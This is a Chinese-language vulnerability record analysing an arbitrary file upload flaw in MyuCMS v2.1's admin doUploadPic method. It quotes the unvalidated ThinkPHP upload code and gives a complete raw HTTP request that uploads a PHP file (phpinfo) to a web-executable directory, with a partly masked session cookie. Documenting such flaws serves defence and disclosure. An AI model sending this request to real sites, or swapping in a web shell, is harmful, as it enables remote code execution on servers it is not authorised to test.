---
source: "hatch 补库批 20260928"
product: "MyuCMS2.1 Forum.doUploadPic / ThinkPHP"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "MyuCMS v2.1 文件上传漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：后台forum接口认证待核验；move不验证扩展，uploads可Web执行PHP"
side_effects: "未执行；本文需注意的操作影响：缺ThinkPHP具体版本/上传后返回路径或执行响应；CNVD没编号"
source_status: "unknown"
id: "vw-f65d45d7dc76e175ace3b6e3"
entity_id: "ve-f65d45d7dc76e175ace3b6e3"
schema_version: "1"
---

## 核对与使用边界

- 凭据处理：本文抓包中的可识别会话/防伪或认证值已仅将中段替换为星号，保留首尾及原长度便于对照；遮罩后的历史值不能作为可用登录凭据。原操作、请求方法和攻击表达式保留。

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：后台forum接口认证待核验；move不验证扩展，uploads可Web执行PHP

- **凭据与会话边界（1）**：控制器方法缺父类鉴权，HTTP附会话，不能据短函数称无认证。抓包中的会话不能视为未认证访问证明；可识别的真实会话值按中段星号遮罩处理，默认演示值和攻击语法保留。需重新取得授权测试会话，不能复用文中值。

- **事实待核（2）**：缺ThinkPHP具体版本/上传后返回路径或执行响应；CNVD没编号。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **结论使用边界（3）**：源码与multipart字段一致，原始Content-Length须重新计算不能视固定。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# MyuCMS v2.1 文件上传漏洞

一、漏洞简介
------------

二、漏洞影响
------------

MyuCMS v2.1

三、复现过程
------------

CNVD 上对应的标题为 **myucms fo\*\*\*.php页面存在文件上传漏洞**

搜索项目中fo开头的文件，定位到
**application/admin/controller/Forum.php** 中的 **doUploadPic** 方法

    public function doUploadPic()
        {
            $file = request()->file('FileName');
            $info = $file->move(ROOT_PATH . DS . 'uploads');
            if($info){
                $path = WEB_URL . DS . 'uploads' . DS .$info->getSaveName();
                echo str_replace("\\","/",$path);
            }
        }

可以看到上述代码调用了 **Thinkphp** 内置的 **move**
方法来对上传的文件进行处理。但是在调用 **move** 方法前未调用
**validate()** 方法来设置验证规则。以至于此处形成了任意文件上传漏洞。

### Payload

根据 **doUploadPic()** 方法构建 **Payload数据包** 如下：

    POST /admin/forum/doUploadPic HTTP/1.1
    Host: www.0-sec.org
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Connection: close
    Content-Type: multipart/form-data; boundary=---------------------------18467633426500
    Cookie: PHPSESSID=l6i********************q90; UM_distinctid=170343d2b4a291-0a4e487f247e62-4c302978-1fa400-170343d2b4b28f; CNZZDATA1277972876=1874892142-1581419669-%7C1581432904
    Upgrade-Insecure-Requests: 1
    Content-Length: 206

    -----------------------------18467633426500
    Content-Disposition: form-data; name="FileName"; filename="1.php"
    Content-Type: image/jpeg

    <?php phpinfo(); ?>
    -----------------------------18467633426500--

参考链接
--------

> https://xz.aliyun.com/t/7271\#toc-0
